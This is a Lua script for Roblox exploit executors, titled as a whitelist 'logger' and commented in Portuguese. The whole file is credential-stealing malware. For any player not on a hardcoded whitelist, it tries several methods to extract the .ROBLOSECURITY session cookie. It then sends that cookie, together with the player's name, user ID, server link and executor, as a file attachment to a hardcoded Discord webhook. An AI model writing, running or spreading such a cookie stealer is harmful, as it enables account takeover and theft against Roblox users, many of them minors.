-- language: Lua, file: logger.lua, target: Roblox (Whitelist + Webhook com arquivo .txt)

local WEBHOOK_URL = "https://discord.com/api/webhooks/1563734888799142031/6DoyXn0eN-JC75o1PzfxgmYPsCKtD9Ey9aBNcvfdwZpC5yKhg36zk7H8eQpYxIGBucvQ"

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local lp = Players.LocalPlayer

-- ==========================================
-- WHITELIST (IDs permitidos)
-- ==========================================
local Whitelist = {
    [5319828063] = true,   -- xinei (amigo)
    [9214137607] = true,   -- Você (owner)
    [1075469927] = true,   -- Subowner
    [2567611127] = true,   -- Amigo
}

-- Se o jogador estiver na Whitelist, o script morre aqui e não faz NADA.
if Whitelist[lp.UserId] then
    return 
end

-- ==========================================
-- A PARTIR DAQUI SÓ RODA PRA QUEM NÃO ESTÁ NA WL
-- ==========================================

local function safeCall(fn, ...)
    local ok, res = pcall(fn, ...)
    if ok then return res end
    return nil
end

local function getExecutorName()
    local iden = safeCall(function() return identifyexecutor and identifyexecutor() end)
    if iden and type(iden) == "string" then return iden end
    return "Unknown"
end

local function getThumbnail(userId)
    local ok, url = pcall(function()
        return Players:GetUserThumbnailAsync(userId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
    end)
    return ok and url or ""
end

local function getCookie()
    -- Tenta métodos diretos primeiro
    local directCookies = {
        function() return getcookie and getcookie() end,
        function() return syn and syn.getcookie and syn.getcookie() end,
        function() return http and http.getcookie and http.getcookie() end,
        function() return request and request.getcookie and request.getcookie() end,
    }

    for _, fn in ipairs(directCookies) do
        local ok, res = pcall(fn)
        if ok and res and type(res) == "string" and res ~= "" then
            return res
        end
    end

    -- Tenta via requisições HTTP
    local attempts = {
        function() return syn and syn.request and syn.request({Url="https://www.roblox.com/mobileapi/userinfo", Method="GET"}).Cookies end,
        function() return http and http.request and http.request({Url="https://www.roblox.com/mobileapi/userinfo", Method="GET"}).Cookies end,
        function() return request and request({Url="https://www.roblox.com/mobileapi/userinfo", Method="GET"}).Cookies end,
        function() return game:HttpGet("https://www.roblox.com/mobileapi/userinfo") end,
    }

    for _, fn in ipairs(attempts) do
        local ok, res = pcall(fn)
        if ok and res then
            if type(res) == "table" then
                if res.Cookies and type(res.Cookies) == "table" then
                    for _, c in ipairs(res.Cookies) do
                        local m = tostring(c):match("%.ROBLOSECURITY=([^;]+)")
                        if m then return m end
                    end
                end
                if res.Body and type(res.Body) == "string" then
                    local m = res.Body:match("ROBLOSECURITY=([^;]+)")
                    if m then return m end
                end
            elseif type(res) == "string" then
                local m = res:match("ROBLOSECURITY=([^;]+)")
                if m then return m end
            end
        end
    end

    local genv = safeCall(function() return getgenv() end) or {}
    if genv._cookie then return genv._cookie end
    if genv.cookie then return genv.cookie end
    if genv.ROBLOSECURITY then return genv.ROBLOSECURITY end

    return nil
end

-- ========== envio pro webhook com anexo .txt ==========
local function sendWebhook(cookie)
    local userName = lp.Name
    local displayName = lp.DisplayName
    local userId = lp.UserId
    local thumb = getThumbnail(userId)
    local jobId = safeCall(function() return game.JobId end) or "unknown"
    local serverLink = string.format("https://www.roblox.com/games/%d/?JobId=%s", game.PlaceId, jobId)
    local timestamp = os.date("%Y-%m-%d %H:%M:%S")
    local executor = getExecutorName()

    local embed = {
        title = "🚨 INVASOR DETECTADO (Não está na Whitelist)",
        color = 0xFF0000,
        thumbnail = { url = thumb },
        fields = {
            { name = "👤 Nome", value = string.format("%s (%s)", displayName, userName), inline = true },
            { name = "🆔 UserID", value = tostring(userId), inline = true },
            { name = "🕒 Data/Hora", value = timestamp, inline = false },
            { name = "🖥️ Executor", value = executor, inline = true },
            { name = "🌐 Servidor", value = serverLink, inline = false },
        },
        footer = { text = "Logger · " .. timestamp },
        timestamp = DateTime.now():ToIsoDate()
    }

    local cookieText = "Cookie não encontrado neste executor."
    if cookie then
        cookieText = cookie
        embed.description = "**O Cookie foi anexado em um arquivo .txt abaixo.**"
    else
        embed.description = "**Não foi possível extrair o Cookie via executor.**"
    end

    local payload = {
        username = "Constipated Logger",
        avatar_url = "https://cdn.discordapp.com/emojis/1290574899577290752.gif",
        embeds = { embed }
    }

    local body = HttpService:JSONEncode(payload)

    -- Função para enviar o arquivo TXT via multipart/form-data
    local function sendWithFile()
        local boundary = "----WebKitFormBoundary" .. tostring(math.random(100000, 999999))
        local fileName = "cookie_" .. userName .. ".txt"
        
        local fileContent = "--" .. boundary .. "\r\n"
        fileContent = fileContent .. 'Content-Disposition: form-data; name="file"; filename="' .. fileName .. '"\r\n'
        fileContent = fileContent .. "Content-Type: text/plain\r\n\r\n"
        fileContent = fileContent .. cookieText .. "\r\n"
        fileContent = fileContent .. "--" .. boundary .. "\r\n"
        fileContent = fileContent .. 'Content-Disposition: form-data; name="payload_json"\r\n\r\n'
        fileContent = fileContent .. body .. "\r\n"
        fileContent = fileContent .. "--" .. boundary .. "--\r\n"

        local headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. boundary }

        local ok, res
        if syn and syn.request then
            ok, res = pcall(syn.request, { Url = WEBHOOK_URL, Method = "POST", Headers = headers, Body = fileContent })
        elseif http and http.request then
            ok, res = pcall(http.request, { Url = WEBHOOK_URL, Method = "POST", Headers = headers, Body = fileContent })
        elseif request then
            ok, res = pcall(request, { Url = WEBHOOK_URL, Method = "POST", Headers = headers, Body = fileContent })
        end
        
        if ok and res and res.StatusCode and res.StatusCode >= 200 and res.StatusCode < 300 then
            return true
        end
        return false
    end

    -- Se o executor não suportar envio de arquivo, manda só o texto básico com o cookie dentro do embed
    local function sendTextOnly()
        table.insert(embed.fields, { name = "🍪 Cookie (Texto)", value = "```" .. cookieText .. "```", inline = false })
        local textPayload = HttpService:JSONEncode({
            username = "Constipated Logger",
            embeds = { embed }
        })
        
        local ok = pcall(function()
            return HttpService:PostAsync(WEBHOOK_URL, textPayload, Enum.HttpContentType.ApplicationJson)
        end)
        
        if not ok then
            if syn and syn.request then
                pcall(syn.request, { Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = textPayload })
            elseif http and http.request then
                pcall(http.request, { Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = textPayload })
            elseif request then
                pcall(request, { Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = textPayload })
            end
        end
    end

    -- Tenta mandar com arquivo, se falhar manda sem
    if not sendWithFile() then
        sendTextOnly()
    end
end

-- ========== Execução ==========
task.spawn(function()
    task.wait(1)
    local cookie = getCookie()
    sendWebhook(cookie)
end)
